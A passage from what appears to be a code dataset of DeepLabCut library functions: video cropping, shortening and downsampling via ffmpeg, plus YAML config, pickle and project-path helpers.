            image = skimage.color.rgba2rgb(image)
        return img_as_ubyte(image)
    elif mode == 'cv2':
        return cv2.imread(image_path, cv2.IMREAD_UNCHANGED)[..., ::-1]"
AlexEMG/DeepLabCut,imresize,"def imresize(img, size=1.0, interpolationmethod=cv2.INTER_AREA):
    if size != 1.0:
        return cv2.resize(img, None, fx=size, fy=size, interpolation=interpolationmethod)
    else:
        return img"
AlexEMG/DeepLabCut,ShortenVideo,"def ShortenVideo(vname, start='00:00:01', stop='00:01:00', outsuffix='short', outpath=None):
    """"""
    Auxiliary function to shorten video and output with outsuffix appended.
    to the same folder from start (hours:minutes:seconds) to stop (hours:minutes:seconds).

    Returns the full path to the shortened video!

    Parameter
    ----------
    videos : string
        A string containing the full paths of the video.

    start: hours:minutes:seconds
        Time formatted in hours:minutes:seconds, where shortened video shall start.

    stop: hours:minutes:seconds
        Time formatted in hours:minutes:seconds, where shortened video shall end.

    outsuffix: str
        Suffix for output videoname (see example).

    outpath: str
        Output path for saving video to (by default will be the same folder as the video)

    Examples
    ----------

    Linux/MacOs
    >>> deeplabcut.ShortenVideo('/data/videos/mouse1.avi')

    Extracts (sub)video from 1st second to 1st minutes (default values) and saves it in /data/videos as mouse1short.avi

    Windows:
    >>> deeplabcut.ShortenVideo('C:\\yourusername\\rig-95\\Videos\\reachingvideo1.avi', start='00:17:00',stop='00:22:00',outsuffix='brief')

    Extracts (sub)video from minute 17 to 22 and and saves it in C:\\yourusername\\rig-95\\Videos as reachingvideo1brief.avi
    """"""
    writer = VideoWriter(vname)
    return writer.shorten(start, stop, outsuffix, outpath)"
AlexEMG/DeepLabCut,CropVideo,"def CropVideo(vname, width=256, height=256, origin_x=0, origin_y=0, outsuffix='cropped', outpath=None, useGUI=False):
    """"""
    Auxiliary function to crop a video and output it to the same folder with ""outsuffix"" appended in its name.
    Width and height will control the new dimensions.

    Returns the full path to the downsampled video!

    ffmpeg -i in.mp4 -filter:v ""crop=out_w:out_h:x:y"" out.mp4

    Parameter
    ----------
    vname : string
        A string containing the full path of the video.

    width: int
        width of output video

    height: int
        height of output video.

    origin_x, origin_y: int
        x- and y- axis origin of bounding box for cropping.

    outsuffix: str
        Suffix for output videoname (see example).

    outpath: str
        Output path for saving video to (by default will be the same folder as the video)

    Examples
    ----------

    Linux/MacOs
    >>> deeplabcut.CropVideo('/data/videos/mouse1.avi')

    Crops the video using default values and saves it in /data/videos as mouse1cropped.avi

    Windows:
    >>> =deeplabcut.CropVideo('C:\\yourusername\\rig-95\\Videos\\reachingvideo1.avi', width=220,height=320,outsuffix='cropped')

    Crops the video to a width of 220 and height of 320 starting at the origin (top left) and saves it in C:\\yourusername\\rig-95\\Videos as reachingvideo1cropped.avi
    """"""
    writer = VideoWriter(vname)
    if useGUI:
        print('Please, select your coordinates (draw from top left to bottom right ...)')
        coords = draw_bbox(vname)
        if not coords:
            return
        (origin_x, origin_y) = coords[:2]
        width = int(coords[2]) - int(coords[0])
        height = int(coords[3]) - int(coords[1])
    writer.set_bbox(origin_x, origin_x + width, origin_y, origin_y + height)
    return writer.crop(outsuffix, outpath)"
AlexEMG/DeepLabCut,DownSampleVideo,"def DownSampleVideo(vname, width=-1, height=200, outsuffix='downsampled', outpath=None, rotatecw='No', angle=0.0):
    """"""
    Auxiliary function to downsample a video and output it to the same folder with ""outsuffix"" appended in its name.
    Width and height will control the new dimensions. You can also pass only height or width and set the other one to -1,
    this will keep the aspect ratio identical.

    Returns the full path to the downsampled video!

    Parameter
    ----------
    vname : string
        A string containing the full path of the video.

    width: int
        width of output video

    height: int
        height of output video.

    outsuffix: str
        Suffix for output videoname (see example).

    outpath: str
        Output path for saving video to (by default will be the same folder as the video)

    rotatecw: str
        Default ""No"", rotates clockwise if ""Yes"", ""Arbitrary"" for arbitrary rotation by specified angle.

    angle: float
        Angle to rotate by in degrees, default 0.0. Negative values rotate counter-clockwise

    Examples
    ----------

    Linux/MacOs
    >>> deeplabcut.DownSampleVideo('/data/videos/mouse1.avi')

    Downsamples the video using default values and saves it in /data/videos as mouse1cropped.avi

    Windows:
    >>> shortenedvideoname=deeplabcut.DownSampleVideo('C:\\yourusername\\rig-95\\Videos\\reachingvideo1.avi', width=220,height=320,outsuffix='cropped')

    Downsamples the video to a width of 220 and height of 320 and saves it in C:\\yourusername\\rig-95\\Videos as reachingvideo1cropped.avi
    """"""
    writer = VideoWriter(vname)
    return writer.rescale(width, height, rotatecw, angle, outsuffix, outpath)"
AlexEMG/DeepLabCut,draw_bbox,"def draw_bbox(video):
    import matplotlib.pyplot as plt
    from matplotlib.widgets import RectangleSelector, Button
    clip = VideoWriter(video)
    frame = None
    while frame is None:
        frame = clip.read_frame()
    bbox = [0, 0, frame.shape[1], frame.shape[0]]

    def line_select_callback(eclick, erelease):
        bbox[:2] = (int(eclick.xdata), int(eclick.ydata))
        bbox[2:] = (int(erelease.xdata), int(erelease.ydata))

    def validate_crop(*args):
        fig.canvas.stop_event_loop()

    def display_help(*args):
        print('1. Use left click to select the region of interest. A red box will be drawn around the selected region. \n\n2. Use the corner points to expand the box and center to move the box around the image. \n\n3. Click ')
    fig = plt.figure()
    ax = fig.add_subplot(111)
    ax.imshow(frame)
    ax_help = fig.add_axes([0.9, 0.2, 0.1, 0.1])
    ax_save = fig.add_axes([0.9, 0.1, 0.1, 0.1])
    crop_button = Button(ax_save, 'Crop')
    crop_button.on_clicked(validate_crop)
    help_button = Button(ax_help, 'Help')
    help_button.on_clicked(display_help)
    rs = RectangleSelector(ax, line_select_callback, minspanx=5, minspany=5, interactive=True, spancoords='pixels')
    plt.show(block=False)
    fig.canvas.start_event_loop(timeout=-1)
    plt.close(fig)
    return bbox"
AlexEMG/DeepLabCut,__init__,"def __init__(self, video_path):
    if not os.path.isfile(video_path):
        raise ValueError(f'Video path ""{video_path}"" does not point to a file.')
    self.video_path = video_path
    self.video = cv2.VideoCapture(video_path)
    if not self.video.isOpened():
        raise IOError('Video could not be opened; it may be corrupted.')
    self.parse_metadata()
    self._bbox = (0, 1, 0, 1)
    self._n_frames_robust = None"
AlexEMG/DeepLabCut,__repr__,"def __repr__(self):
    string = 'Video (duration={:0.2f}, fps={}, dimensions={}x{})'
    return string.format(self.calc_duration(), self.fps, *self.dimensions)"
AlexEMG/DeepLabCut,__len__,"def __len__(self):
    return self._n_frames"
AlexEMG/DeepLabCut,check_integrity,"def check_integrity(self):
    dest = os.path.join(self.directory, f'{self.name}.log')
    command = f'ffmpeg -v error -i ""{self.video_path}"" -f null - 2>""{dest}""'
    subprocess.call(command, shell=True)
    if os.path.getsize(dest) != 0:
        warnings.warn(f'Video contains errors. See ""{dest}"" for a detailed report.')"
AlexEMG/DeepLabCut,check_integrity_robust,"def check_integrity_robust(self):
    numframes = self.video.get(cv2.CAP_PROP_FRAME_COUNT)
    fr = 0
    while fr < numframes:
        (success, frame) = self.video.read()
        if not success or frame is None:
            warnings.warn(f'Opencv failed to load frame {fr}. Use ffmpeg to re-encode video file')
        fr += 1"
AlexEMG/DeepLabCut,name,"@property
def name(self):
    return os.path.splitext(os.path.split(self.video_path)[1])[0]"
AlexEMG/DeepLabCut,format,"@property
def format(self):
    return os.path.splitext(self.video_path)[1]"
AlexEMG/DeepLabCut,directory,"@property
def directory(self):
    return os.path.dirname(self.video_path)"
AlexEMG/DeepLabCut,metadata,"@property
def metadata(self):
    return dict(n_frames=len(self), fps=self.fps, width=self.width, height=self.height)"
AlexEMG/DeepLabCut,get_n_frames,"def get_n_frames(self, robust=False):
    if not robust:
        return self._n_frames
    elif not self._n_frames_robust:
        command = f'ffprobe -i ""{self.video_path}"" -v error -count_frames -select_streams v:0 -show_entries stream=nb_read_frames -of default=nokey=1:noprint_wrappers=1'
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        self._n_frames_robust = int(output)
    return self._n_frames_robust"
AlexEMG/DeepLabCut,calc_duration,"def calc_duration(self, robust=False):
    if robust:
        command = f'ffprobe -i ""{self.video_path}"" -show_entries format=duration -v quiet -of csv=""p=0""'
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return float(output)
    return len(self) / self.fps"
AlexEMG/DeepLabCut,set_to_frame,"def set_to_frame(self, ind):
    if ind < 0:
        raise ValueError('Index must be a positive integer.')
    last_frame = len(self) - 1
    if ind > last_frame:
        warnings.warn('Index exceeds the total number of frames. Setting to last frame instead.')
        ind = last_frame
    self.video.set(cv2.CAP_PROP_POS_FRAMES, ind)"
AlexEMG/DeepLabCut,reset,"def reset(self):
    self.set_to_frame(0)"
AlexEMG/DeepLabCut,read_frame,"def read_frame(self, shrink=1, crop=False):
    (success, frame) = self.video.read()
    if not success:
        return
    frame = frame[..., ::-1]
    if crop:
        (x1, x2, y1, y2) = self.get_bbox(relative=False)
        frame = frame[y1:y2, x1:x2]
    if shrink > 1:
        (h, w) = frame.shape[:2]
        frame = cv2.resize(frame, (w // shrink, h // shrink), fx=0, fy=0, interpolation=cv2.INTER_AREA)
    return frame"
AlexEMG/DeepLabCut,get_bbox,"def get_bbox(self, relative=False):
    (x1, x2, y1, y2) = self._bbox
    if not relative:
        x1 = int(self._width * x1)
        x2 = int(self._width * x2)
        y1 = int(self._height * y1)
        y2 = int(self._height * y2)
    return (x1, x2, y1, y2)"
AlexEMG/DeepLabCut,fps,"@property
def fps(self):
    return self._fps"
AlexEMG/DeepLabCut,fps,"@fps.setter
def fps(self, fps):
    if not fps > 0:
        raise ValueError('Frame rate should be positive.')
    self._fps = fps"
AlexEMG/DeepLabCut,width,"@property
def width(self):
    (x1, x2, _, _) = self.get_bbox(relative=False)
    return x2 - x1"
AlexEMG/DeepLabCut,height,"@property
def height(self):
    (_, _, y1, y2) = self.get_bbox(relative=False)
    return y2 - y1"
AlexEMG/DeepLabCut,dimensions,"@property
def dimensions(self):
    return (self.width, self.height)"
AlexEMG/DeepLabCut,parse_metadata,"def parse_metadata(self):
    self._n_frames = int(self.video.get(cv2.CAP_PROP_FRAME_COUNT))
    if self._n_frames >= 1000000000.0:
        warnings.warn('The video has more than 10^9 frames, we recommend chopping it up.')
    self._width = int(self.video.get(cv2.CAP_PROP_FRAME_WIDTH))
    self._height = int(self.video.get(cv2.CAP_PROP_FRAME_HEIGHT))
    self._fps = round(self.video.get(cv2.CAP_PROP_FPS), 2)"
AlexEMG/DeepLabCut,close,"def close(self):
    self.video.release()"
AlexEMG/DeepLabCut,__init__,"def __init__(self, video_path, codec='h264', dpi=100, fps=None):
    super(VideoWriter, self).__init__(video_path)
    self.codec = codec
    self.dpi = dpi
    if fps:
        self.fps = fps"
AlexEMG/DeepLabCut,set_bbox,"def set_bbox(self, x1, x2, y1, y2, relative=False):
    if x2 <= x1 or y2 <= y1:
        raise ValueError(f'Coordinates look wrong... Ensure {x1} < {x2} and {y1} < {y2}.')
    if not relative:
        x1 /= self._width
        x2 /= self._width
        y1 /= self._height
        y2 /= self._height
    bbox = (x1, x2, y1, y2)
    if any((coord > 1 for coord in bbox)):
        warnings.warn('Bounding box larger than the video... Clipping to video dimensions.')
        bbox = tuple(map(lambda x: min(x, 1), bbox))
    self._bbox = bbox"
AlexEMG/DeepLabCut,shorten,"def shorten(self, start, end, suffix='short', dest_folder=None, validate_inputs=True):
    """"""
        Shorten the video from start to end.

        Parameter
        ----------
        start: str
            Time formatted in hours:minutes:seconds, where shortened video shall start.

        end: str
            Time formatted in hours:minutes:seconds, where shortened video shall end.

        suffix: str, optional
            String added to the name of the shortened video ('short' by default).

        dest_folder: str, optional
            Folder the video is saved into (by default, same as the original video)

        Returns
        -------
        str
            Full path to the shortened video
        """"""

    def validate_timestamp(stamp):
        if not isinstance(stamp, str):
            raise ValueError('Timestamp should be a string formatted as hours:minutes:seconds.')
        time = datetime.datetime.strptime(stamp, '%H:%M:%S').time()
        seconds = (time.hour * 60 + time.minute) * 60 + time.second
        if seconds > self.calc_duration():
            raise ValueError('Timestamps must not exceed the video duration.')
    if validate_inputs:
        for stamp in (start, end):
            validate_timestamp(stamp)
    output_path = self.make_output_path(suffix, dest_folder)
    command = f'ffmpeg -n -i ""{self.video_path}"" -ss {start} -to {end} -c:a copy ""{output_path}""'
    subprocess.call(command, shell=True)
    return output_path"
AlexEMG/DeepLabCut,split,"def split(self, n_splits, suffix='split', dest_folder=None):
    """"""
        Split a video into several shorter ones of equal duration.

        Parameters
        ----------
        n_splits : int
            Number of shorter videos to produce

        suffix: str, optional
            String added to the name of the splits ('short' by default).

        dest_folder: str, optional
            Folder the video splits are saved into (by default, same as the original video)

        Returns
        -------
        list
            Paths of the video splits
        """"""
    if not n_splits > 1:
        raise ValueError('The video should at least be split in half.')
    chunk_dur = self.calc_duration() / n_splits
    splits = np.arange(n_splits + 1) * chunk_dur
    time_formatter = lambda val: str(datetime.timedelta(seconds=val))
    clips = []
    for (n, (start, end)) in enumerate(zip(splits, splits[1:]), start=1):
        clips.append(self.shorten(time_formatter(start), time_formatter(end), f'{suffix}{n}', dest_folder, validate_inputs=False))
    return clips"
AlexEMG/DeepLabCut,crop,"def crop(self, suffix='crop', dest_folder=None):
    (x1, _, y1, _) = self.get_bbox()
    output_path = self.make_output_path(suffix, dest_folder)
    command = f'ffmpeg -n -i ""{self.video_path}"" -filter:v crop={self.width}:{self.height}:{x1}:{y1} -c:a copy ""{output_path}""'
    subprocess.call(command, shell=True)
    return output_path"
AlexEMG/DeepLabCut,rescale,"def rescale(self, width, height=-1, rotatecw='No', angle=0.0, suffix='rescale', dest_folder=None):
    output_path = self.make_output_path(suffix, dest_folder)
    command = f'ffmpeg -n -i ""{self.video_path}"" -filter:v ""scale={width}:{height}{{}}"" -c:a copy ""{output_path}""'
    if rotatecw == 'Arbitrary':
        angle = np.deg2rad(angle)
        command = command.format(f', rotate={angle}')
    elif rotatecw == 'Yes':
        command = command.format(f', transpose=1')
    else:
        command = command.format('')
    subprocess.call(command, shell=True)
    return output_path"
AlexEMG/DeepLabCut,write_frame,"@staticmethod
def write_frame(frame, where):
    cv2.imwrite(where, frame[..., ::-1])"
AlexEMG/DeepLabCut,make_output_path,"def make_output_path(self, suffix, dest_folder):
    if not dest_folder:
        dest_folder = self.directory
    return os.path.join(dest_folder, f'{self.name}{suffix}{self.format}')"
AlexEMG/DeepLabCut,line_select_callback,"def line_select_callback(eclick, erelease):
    bbox[:2] = (int(eclick.xdata), int(eclick.ydata))
    bbox[2:] = (int(erelease.xdata), int(erelease.ydata))"
AlexEMG/DeepLabCut,validate_crop,"def validate_crop(*args):
    fig.canvas.stop_event_loop()"
AlexEMG/DeepLabCut,display_help,"def display_help(*args):
    print('1. Use left click to select the region of interest. A red box will be drawn around the selected region. \n\n2. Use the corner points to expand the box and center to move the box around the image. \n\n3. Click ')"
AlexEMG/DeepLabCut,validate_timestamp,"def validate_timestamp(stamp):
    if not isinstance(stamp, str):
        raise ValueError('Timestamp should be a string formatted as hours:minutes:seconds.')
    time = datetime.datetime.strptime(stamp, '%H:%M:%S').time()
    seconds = (time.hour * 60 + time.minute) * 60 + time.second
    if seconds > self.calc_duration():
        raise ValueError('Timestamps must not exceed the video duration.')"
AlexEMG/DeepLabCut,create_config_template,"def create_config_template(multianimal=False):
    """"""
    Creates a template for config.yaml file. This specific order is preserved while saving as yaml file.
    """"""
    if multianimal:
        yaml_str = '    # Project definitions (do not edit)\n        Task:\n        scorer:\n        date:\n        multianimalproject:\n        identity:\n        \n\n    # Project path (change when moving around)\n        project_path:\n        \n\n    # Annotation data set configuration (and individual video cropping parameters)\n        video_sets:\n        individuals:\n        uniquebodyparts:\n        multianimalbodyparts:\n        bodyparts:\n        \n\n    # Fraction of video to start/stop when extracting frames for labeling/refinement\n        start:\n        stop:\n        numframes2pick:\n        \n\n    # Plotting configuration\n        skeleton:\n        skeleton_color:\n        pcutoff:\n        dotsize:\n        alphavalue:\n        colormap:\n        \n\n    # Training,Evaluation and Analysis configuration\n        TrainingFraction:\n        iteration:\n        default_net_type:\n        default_augmenter:\n        default_track_method:\n        snapshotindex:\n        batch_size:\n        \n\n    # Cropping Parameters (for analysis and outlier frame detection)\n        cropping:\n    #if cropping is true for analysis, then set the values here:\n        x1:\n        x2:\n        y1:\n        y2:\n        \n\n    # Refinement configuration (parameters from annotation dataset configuration also relevant in this stage)\n        corner2move2:\n        move2corner:\n        '
    else:
        yaml_str = '    # Project definitions (do not edit)\n        Task:\n        scorer:\n        date:\n        multianimalproject:\n        identity:\n        \n\n    # Project path (change when moving around)\n        project_path:\n        \n\n    # Annotation data set configuration (and individual video cropping parameters)\n        video_sets:\n        bodyparts:\n        \n\n    # Fraction of video to start/stop when extracting frames for labeling/refinement\n        start:\n        stop:\n        numframes2pick:\n        \n\n    # Plotting configuration\n        skeleton:\n        skeleton_color:\n        pcutoff:\n        dotsize:\n        alphavalue:\n        colormap:\n        \n\n    # Training,Evaluation and Analysis configuration\n        TrainingFraction:\n        iteration:\n        default_net_type:\n        default_augmenter:\n        snapshotindex:\n        batch_size:\n        \n\n    # Cropping Parameters (for analysis and outlier frame detection)\n        cropping:\n    #if cropping is true for analysis, then set the values here:\n        x1:\n        x2:\n        y1:\n        y2:\n        \n\n    # Refinement configuration (parameters from annotation dataset configuration also relevant in this stage)\n        corner2move2:\n        move2corner:\n        '
    ruamelFile = YAML()
    cfg_file = ruamelFile.load(yaml_str)
    return (cfg_file, ruamelFile)"
AlexEMG/DeepLabCut,create_config_template_3d,"def create_config_template_3d():
    """"""
    Creates a template for config.yaml file for 3d project. This specific order is preserved while saving as yaml file.
    """"""
    yaml_str = '# Project definitions (do not edit)\n    Task:\n    scorer:\n    date:\n    \n\n# Project path (change when moving around)\n    project_path:\n    \n\n# Plotting configuration\n    skeleton: # Note that the pairs must be defined, as you want them linked!\n    skeleton_color:\n    pcutoff:\n    colormap:\n    dotsize:\n    alphaValue:\n    markerType:\n    markerColor:\n    \n\n# Number of cameras, camera names, path of the config files, shuffle index and trainingsetindex used to analyze videos:\n    num_cameras:\n    camera_names:\n    scorername_3d: # Enter the scorer name for the 3D output\n    '
    ruamelFile_3d = YAML()
    cfg_file_3d = ruamelFile_3d.load(yaml_str)
    return (cfg_file_3d, ruamelFile_3d)"
AlexEMG/DeepLabCut,read_config,"def read_config(configname):
    """"""
    Reads structured config file defining a project.
    """"""
    ruamelFile = YAML()
    path = Path(configname)
    if os.path.exists(path):
        try:
            with open(path, 'r') as f:
                cfg = ruamelFile.load(f)
                curr_dir = os.path.dirname(configname)
                if cfg['project_path'] != curr_dir:
                    cfg['project_path'] = curr_dir
                    write_config(configname, cfg)
        except Exception as err:
            if len(err.args) > 2:
                if err.args[2] == ""could not determine a constructor for the tag '!!python/tuple'"":
                    with open(path, 'r') as ymlfile:
                        cfg = yaml.load(ymlfile, Loader=yaml.SafeLoader)
                        write_config(configname, cfg)
                else:
                    raise
    else:
        raise FileNotFoundError('Config file is not found. Please make sure that the file exists and/or that you passed the path of the config file correctly!')
    return cfg"
AlexEMG/DeepLabCut,write_config,"def write_config(configname, cfg):
    """"""
    Write structured config file.
    """"""
    with open(configname, 'w') as cf:
        (cfg_file, ruamelFile) = create_config_template(cfg.get('multianimalproject', False))
        for key in cfg.keys():
            cfg_file[key] = cfg[key]
        if not 'skeleton' in cfg.keys():
            cfg_file['skeleton'] = []
            cfg_file['skeleton_color'] = 'black'
        ruamelFile.dump(cfg_file, cf)"
AlexEMG/DeepLabCut,edit_config,"def edit_config(configname, edits, output_name=''):
    """"""
    Convenience function to edit and save a config file from a dictionary.

    Parameters
    ----------
    configname : string
        String containing the full path of the config file in the project.
    edits : dict
        Key–value pairs to edit in config
    output_name : string, optional (default='')
        Overwrite the original config.yaml by default.
        If passed in though, new filename of the edited config.

    Examples
    --------
    config_path = 'my_stellar_lab/dlc/config.yaml'

    edits = {'numframes2pick': 5,
             'trainingFraction': [0.5, 0.8],
             'skeleton': [['a', 'b'], ['b', 'c']]}

    deeplabcut.auxiliaryfunctions.edit_config(config_path, edits)
    """"""
    cfg = read_plainconfig(configname)
    for (key, value) in edits.items():
        cfg[key] = value
    if not output_name:
        output_name = configname
    try:
        write_plainconfig(output_name, cfg)
    except ruamel.yaml.representer.RepresenterError:
        warnings.warn('Some edits could not be written. The configuration file will be left unchanged.')
        for key in edits:
            cfg.pop(key)
        write_plainconfig(output_name, cfg)
    return cfg"
AlexEMG/DeepLabCut,write_config_3d,"def write_config_3d(configname, cfg):
    """"""
    Write structured 3D config file.
    """"""
    with open(configname, 'w') as cf:
        (cfg_file, ruamelFile) = create_config_template_3d()
        for key in cfg.keys():
            cfg_file[key] = cfg[key]
        ruamelFile.dump(cfg_file, cf)"
AlexEMG/DeepLabCut,write_config_3d_template,"def write_config_3d_template(projconfigfile, cfg_file_3d, ruamelFile_3d):
    with open(projconfigfile, 'w') as cf:
        ruamelFile_3d.dump(cfg_file_3d, cf)"
AlexEMG/DeepLabCut,read_plainconfig,"def read_plainconfig(configname):
    if not os.path.exists(configname):
        raise FileNotFoundError(f'Config {configname} is not found. Please make sure that the file exists.')
    with open(configname) as file:
        return YAML().load(file)"
AlexEMG/DeepLabCut,write_plainconfig,"def write_plainconfig(configname, cfg):
    with open(configname, 'w') as file:
        YAML().dump(cfg, file)"
AlexEMG/DeepLabCut,attempt_to_make_folder,"def attempt_to_make_folder(foldername, recursive=False):
    """"""Attempts to create a folder with specified name. Does nothing if it already exists.""""""
    try:
        os.path.isdir(foldername)
    except TypeError:
        foldername = os.fspath(foldername)
    if os.path.isdir(foldername):
        pass
    elif recursive:
        os.makedirs(foldername)
    else:
        os.mkdir(foldername)"
AlexEMG/DeepLabCut,read_pickle,"def read_pickle(filename):
    """"""Read the pickle file""""""
    with open(filename, 'rb') as handle:
        return pickle.load(handle)"
AlexEMG/DeepLabCut,write_pickle,"def write_pickle(filename, data):
    """"""Write the pickle file""""""
    with open(filename, 'wb') as handle:
        pickle.dump(data, handle, protocol=pickle.HIGHEST_PROTOCOL)"
AlexEMG/DeepLabCut,get_list_of_videos,"def get_list_of_videos(videos: typing.Union[typing.List[str], str], videotype: typing.Union[typing.List[str], str]='', in_random_order: bool=True) -> typing.List[str]:
    """"""Returns list of videos of videotype ""videotype"" in
    folder videos or for list of videos.

    NOTE: excludes keyword videos of the form:

    *_labeled.videotype
    *_full.videotype

    Args:
        videos (list[str], str): List of video paths or a single path string. If string (or len() == 1 list of strings) is a directory,
            finds all videos whose extension matches  ``videotype`` in the directory

        videotype (list[str], str): File extension used to filter videos. Optional if ``videos`` is a list of video files,
            and filters with common video extensions if a directory is passed in.

        in_random_order (bool): Whether or not to return a shuffled list of videos.
    """"""
    if isinstance(videos, str):
        videos = [videos]
    if [os.path.isdir(i) for i in videos] == [True]:
        '\n        Returns all the videos in the directory.\n        '
        if not videotype:
            videotype = auxfun_videos.SUPPORTED_VIDEOS
        print('Analyzing all the videos in the directory...')
        videofolder = videos[0]
        videos = [os.path.join(videofolder, fn) for fn in os.listdir(videofolder)]
        if in_random_order:
            from random import shuffle
            shuffle(videos)
        else:
            videos.sort()
    if isinstance(videotype, str):
        videotype = [videotype]
    videos = [v for v in videos if os.path.isfile(v) and any((v.endswith(ext) for ext in videotype)) and ('_labeled.' not in v) and ('_full.' not in v)]
    return videos"
AlexEMG/DeepLabCut,save_data,"def save_data(PredicteData, metadata, dataname, pdindex, imagenames, save_as_csv):
    """"""Save predicted data as h5 file and metadata as pickle file; created by predict_videos.py""""""
    DataMachine = pd.DataFrame(PredicteData, columns=pdindex, index=imagenames)
    if save_as_csv:
        print('Saving csv poses!')
        DataMachine.to_csv(dataname.split('.h5')[0] + '.csv')
    DataMachine.to_hdf(dataname, 'df_with_missing', format='table', mode='w')
    with open(dataname.split('.h5')[0] + '_meta.pickle', 'wb') as f:
        pickle.dump(metadata, f, pickle.HIGHEST_PROTOCOL)"
AlexEMG/DeepLabCut,save_metadata,"def save_metadata(metadatafilename, data, trainIndices, testIndices, trainFraction):
    with open(metadatafilename, 'wb') as f:
        pickle.dump([data, trainIndices, testIndices, trainFraction], f, pickle.HIGHEST_PROTOCOL)"
AlexEMG/DeepLabCut,load_metadata,"def load_metadata(metadatafile):
    with open(metadatafile, 'rb') as f:
        [trainingdata_details, trainIndices, testIndices, testFraction_data] = pickle.load(f)
        return (trainingdata_details, trainIndices, testIndices, testFraction_data)"
AlexEMG/DeepLabCut,get_immediate_subdirectories,"def get_immediate_subdirectories(a_dir):
    """"""Get list of immediate subdirectories""""""
    return [name for name in os.listdir(a_dir) if os.path.isdir(os.path.join(a_dir, name))]"
AlexEMG/DeepLabCut,grab_files_in_folder,"def grab_files_in_folder(folder, ext='', relative=True):
    """"""Return the paths of files with extension *ext* present in *folder*.""""""
    for file in os.listdir(folder):
        if file.endswith(ext):
            yield (file if relative else os.path.join(folder, file))"
AlexEMG/DeepLabCut,get_video_list,"def get_video_list(filename, videopath, videtype):
    """"""Get list of videos in a path (if filetype == all), otherwise just a specific file.""""""
    videos = list(grab_files_in_folder(videopath, videtype))
    if filename == 'all':
        return videos
    elif filename in videos:
        videos = [filename]
    else:
        videos = []
        print('Video not found!', filename)
    return videos"
AlexEMG/DeepLabCut,get_training_set_folder,"def get_training_set_folder(cfg):
    """"""Training Set folder for config file based on parameters""""""
    Task = cfg['Task']
    date = cfg['date']
    iterate = 'iteration-' + str(cfg['iteration'])
    return Path(os.path.join('training-datasets', iterate, 'UnaugmentedDataSet_' + Task + date))"
AlexEMG/DeepLabCut,get_data_and_metadata_filenames,"def get_data_and_metadata_filenames(trainingsetfolder, trainFraction, shuffle, cfg):
    metadatafn = os.path.join(str(trainingsetfolder), 'Documentation_data-' + cfg['Task'] + '_' + str(int(trainFraction * 100)) + 'shuffle' + str(shuffle) + '.pickle')
    datafn = os.path.join(str(trainingsetfolder), cfg['Task'] + '_' + cfg['scorer'] + str(int(100 * trainFraction)) + 'shuffle' + str(shuffle) + '.mat')
    return (datafn, metadatafn)"
AlexEMG/DeepLabCut,get_model_folder,"def get_model_folder(trainFraction, shuffle, cfg, modelprefix=''):
    Task = cfg['Task']
    date = cfg['date']
    iterate = 'iteration-' + str(cfg['iteration'])
    return Path(modelprefix, 'dlc-models', iterate, Task + date + '-trainset' + str(int(trainFraction * 100)) + 'shuffle' + str(shuffle))"
AlexEMG/DeepLabCut,get_evaluation_folder,"def get_evaluation_folder(trainFraction, shuffle, cfg, modelprefix=''):
    Task = cfg['Task']
    date = cfg['date']
    iterate = 'iteration-' + str(cfg['iteration'])
    if 'eval_prefix' in cfg:
        eval_prefix = cfg['eval_prefix']
    else:
        eval_prefix = 'evaluation-results'
    return Path(modelprefix, eval_prefix, iterate, Task + date + '-trainset' + str(int(trainFraction * 100)) + 'shuffle' + str(shuffle))"
AlexEMG/DeepLabCut,get_deeplabcut_path,"def get_deeplabcut_path():
    """"""Get path of where deeplabcut is currently running""""""
    import importlib.util
    return os.path.split(importlib.util.find_spec('deeplabcut').origin)[0]"
AlexEMG/DeepLabCut,intersection_of_body_parts_and_ones_given_by_user,"def intersection_of_body_parts_and_ones_given_by_user(cfg, comparisonbodyparts):
    """"""Returns all body parts when comparisonbodyparts=='all', otherwise all bpts that are in the intersection of comparisonbodyparts and the actual bodyparts""""""
    if cfg['multianimalproject']:
        allbpts = cfg['multianimalbodyparts'] + cfg['uniquebodyparts']
    else:
        allbpts = cfg['bodyparts']
    if comparisonbodyparts == 'all':
        return list(allbpts)
    else:
        cpbpts = [bp for bp in allbpts if bp in comparisonbodyparts]
        return cpbpts"
AlexEMG/DeepLabCut,get_labeled_data_folder,"def get_labeled_data_folder(cfg, video):
    videoname = os.path.splitext(os.path.basename(video))[0]
    return os.path.join(cfg['project_path'], 'labeled-data', videoname)"
AlexEMG/DeepLabCut,form_data_containers,"def form_data_containers(df, bodyparts):
    mask = df.columns.get_level_values('bodyparts').isin(bodyparts)
    df_masked = df.loc[:, mask]
    df_likelihood = df_masked.xs('likelihood', level=-1, axis=1).values.T
    df_x = df_masked.xs('x', level=-1, axis=1).values.T
    df_y = df_masked.xs('y', level=-1, axis=1).values.T
    return (df_x, df_y, df_likelihood)"
AlexEMG/DeepLabCut,get_scorer_name,"def get_scorer_name(cfg, shuffle, trainFraction, trainingsiterations='unknown', modelprefix=''):
    """"""Extract the scorer/network name for a particular shuffle, training fraction, etc.
    Returns tuple of DLCscorer, DLCscorerlegacy (old naming convention)
    """"""
    Task = cfg['Task']
    date = cfg['date']
    if trainingsiterations == 'unknown':
        snapshotindex = cfg['snapshotindex']
        if cfg['snapshotindex'] == 'all':
            print('Changing snapshotindext to the last one -- plotting, videomaking, etc. should not be performed for all indices. For more selectivity enter the ordinal number of the snapshot you want (ie. 4 for the fifth) in the config file.')
            snapshotindex = -1
        else:
            snapshotindex = cfg['snapshotindex']
        modelfolder = os.path.join(cfg['project_path'], str(get_model_folder(trainFraction, shuffle, cfg, modelprefix=modelprefix)), 'train')
        Snapshots = np.array([fn.split('.')[0] for fn in os.listdir(modelfolder) if 'index' in fn])
        increasing_indices = np.argsort([int(m.split('-')[1]) for m in Snapshots])
        Snapshots = Snapshots[increasing_indices]
        SNP = Snapshots[snapshotindex]
        trainingsiterations = SNP.split(os.sep)[-1].split('-')[-1]
    dlc_cfg = read_plainconfig(os.path.join(cfg['project_path'], str(get_model_folder(trainFraction, shuffle, cfg, modelprefix=modelprefix)), 'train', 'pose_cfg.yaml'))
    if 'resnet' in dlc_cfg['net_type']:
        if dlc_cfg.get('multi_stage', False):
            netname = 'dlcrnetms5'
        else:
            netname = dlc_cfg['net_type'].replace('_', '')
    elif 'mobilenet' in dlc_cfg['net_type']:
        netname = 'mobnet_' + str(int(float(dlc_cfg['net_type'].split('_')[-1]) * 100))
    elif 'efficientnet' in dlc_cfg['net_type']:
